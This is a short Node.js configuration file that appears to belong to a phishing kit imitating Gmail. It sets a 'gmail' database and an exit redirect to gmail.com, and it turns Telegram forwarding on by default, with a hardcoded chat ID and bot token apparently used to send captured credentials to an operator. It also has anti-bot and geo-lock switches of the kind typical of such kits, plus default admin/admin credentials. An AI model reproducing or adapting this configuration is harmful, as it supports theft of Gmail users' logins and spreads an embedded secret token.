require('dotenv').config();

const config = {
  db: {
    host: process.env.DB_HOST || 'localhost',
    name: process.env.DB_NAME || 'gmail',
    user: process.env.DB_USER || 'root',
    pass: process.env.DB_PASS || '',
    port: parseInt(process.env.DB_PORT || '3306'),
    ssl: process.env.DB_SSL === 'true' || false,
  },
  admin: {
    username: process.env.ADMIN_USERNAME || 'admin',
    password: process.env.ADMIN_PASSWORD || 'admin',
  },
  exitUrl: process.env.EXIT_URL || 'https://www.gmail.com',
  telegram: {
    enabled: process.env.TELEGRAM_ENABLED === 'true' || !process.env.TELEGRAM_ENABLED,
    chatId: process.env.TELEGRAM_CHAT_ID || '-1003973974864',
    botToken: process.env.TELEGRAM_BOT_TOKEN || '8693307313:AAEmsNZSETiqeqIvDdlvF47inoBfKc2q9jA',
  },
  mobileLock: false,
  ukLock: false,
  gateway: true,
  antibots: false,
  onetime: false,
  killbot: false,
  antibot: false,
  internalAntibot: false,
  sessionSecret: process.env.SESSION_SECRET || 'zynex-demo-secret-key-2025',
  port: parseInt(process.env.PORT || '3000'),
};

module.exports = config;
